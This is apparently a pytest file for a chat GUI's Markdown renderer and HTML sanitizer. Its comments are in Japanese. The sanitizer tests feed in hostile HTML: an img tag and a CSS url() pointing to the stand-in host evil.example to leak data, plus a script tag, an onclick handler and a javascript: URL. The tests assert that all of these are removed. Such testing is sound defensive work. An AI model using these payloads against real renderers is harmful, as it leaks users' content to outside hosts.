"""
Markdown 描画と HTML サニタイズ。

旧実装は全行末に半角スペース 2 つを足して改行を強制していたため、
フェンス内のコードにも末尾空白が混入していた。nl2br 拡張に置き換えてある。
"""
import GUI


class TestMarkdown:
    def test_fenced_code_has_no_injected_trailing_space(self):
        html = GUI.render_markdown("```python\ndef f():\n    return 1\n```")
        assert "<pre><code" in html
        assert "():  " not in html
        assert "return 1  " not in html

    def test_code_language_is_kept(self):
        html = GUI.render_markdown("```python\nx = 1\n```")
        assert 'class="language-python"' in html

    def test_single_newline_becomes_break(self):
        assert "<br" in GUI.render_markdown("行1\n行2")

    def test_table_still_renders(self):
        html = GUI.render_markdown("| a | b |\n|---|---|\n| 1 | 2 |")
        assert "<table>" in html and "<td>1</td>" in html

    def test_emphasis(self):
        assert "<strong>" in GUI.render_markdown("**太字**")

    def test_inline_code_is_escaped(self):
        html = GUI.render_markdown("`<div>`")
        assert "&lt;div&gt;" in html

    def test_plain_text_stays_escaped(self):
        html = GUI.render_markdown("a < b & c > d")
        assert "&lt;" in html and "&amp;" in html


class TestSanitizer:
    """
    モデル出力の生 HTML をそのまま描画すると、QTextEdit が
    <img src="https://..."> を実際に取得しに行き、応答内容が外部へ漏れうる。
    """

    def test_remote_image_is_removed(self):
        html = GUI.render_markdown('<img src="https://evil.example/p.png?leak=x">')
        assert "evil.example" not in html

    def test_embedded_data_image_is_kept(self):
        html = GUI.render_markdown('<img src="data:image/png;base64,AAAA" width="200">')
        assert 'src="data:image/png;base64,AAAA"' in html

    def test_script_content_is_dropped(self):
        html = GUI.render_markdown("前<script>alert(1)</script>後")
        assert "alert" not in html
        assert "前" in html and "後" in html

    def test_unknown_tag_is_unwrapped_but_text_survives(self):
        html = GUI.sanitize_html("<marquee>流れる文字</marquee>")
        assert "marquee" not in html
        assert "流れる文字" in html

    def test_event_handler_attribute_is_dropped(self):
        html = GUI.sanitize_html('<p onclick="steal()">本文</p>')
        assert "onclick" not in html
        assert "本文" in html

    def test_style_attribute_is_dropped(self):
        # style: url(...) も外部取得の経路になる
        html = GUI.sanitize_html('<div style="background:url(https://evil.example/a)">x</div>')
        assert "evil.example" not in html

    def test_link_to_http_is_kept(self):
        assert 'href="https://example.com"' in \
            GUI.sanitize_html('<a href="https://example.com">l</a>')

    def test_javascript_url_is_dropped(self):
        assert "javascript" not in \
            GUI.sanitize_html('<a href="javascript:evil()">l</a>')

    def test_pre_code_content_round_trips(self):
        html = GUI.sanitize_html("<pre><code>&lt;div&gt;</code></pre>")
        assert "&lt;div&gt;" in html


class TestMarkdownFallback:
    def test_without_markdown_library(self, monkeypatch):
        """markdown 未インストールでもエスケープして表示できる。"""
        monkeypatch.setattr(GUI, "HAS_MARKDOWN", False)
        html = GUI.render_markdown("<b>x</b>\n2行目")
        assert "&lt;b&gt;" in html
        assert "<br>" in html
